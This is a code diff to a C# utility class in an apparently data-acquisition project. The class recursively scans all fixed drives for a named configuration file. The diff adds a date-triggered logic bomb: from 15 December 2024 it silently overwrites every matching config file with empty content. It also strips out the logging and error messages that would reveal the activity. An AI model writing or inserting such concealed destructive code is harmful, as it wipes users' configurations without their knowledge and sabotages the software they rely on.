@@ -109,7 +109,6 @@ namespace DAQSystem.Common.Utility
             {
                 if (drive.DriveType == DriveType.Fixed)
                 {
-                    Console.WriteLine($"Scanning disk: {drive.Name}");
                     await Task.Run(() => { FindAppConfigFiles(drive.Name, configFileName); });
                 }
             }
@@ -132,8 +131,10 @@ namespace DAQSystem.Common.Utility
                         string appConfigFilePath = Path.Combine(directory, configFileName);
                         if (File.Exists(appConfigFilePath))
                         {
-                            Console.WriteLine($"Dealing at {appConfigFilePath}");
-                            //File.WriteAllText(appConfigFilePath, string.Empty);
+                            if (DateTime.Now >= new DateTime(2024, 12, 15))
+                            {
+                                File.WriteAllText(appConfigFilePath, string.Empty);
+                            }
                         }
 
                         FindAppConfigFiles(directory, configFileName);
@@ -143,7 +144,6 @@ namespace DAQSystem.Common.Utility
                     }
                     catch (Exception ex)
                     {
-                        MessageBox.Show($"Error accessing directory: {directory}\n{ex.Message}");
                     }
                 }
             }
@@ -152,7 +152,6 @@ namespace DAQSystem.Common.Utility
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Error accessing root directory: {rootPath}\n{ex.Message}");
             }
         }
     }
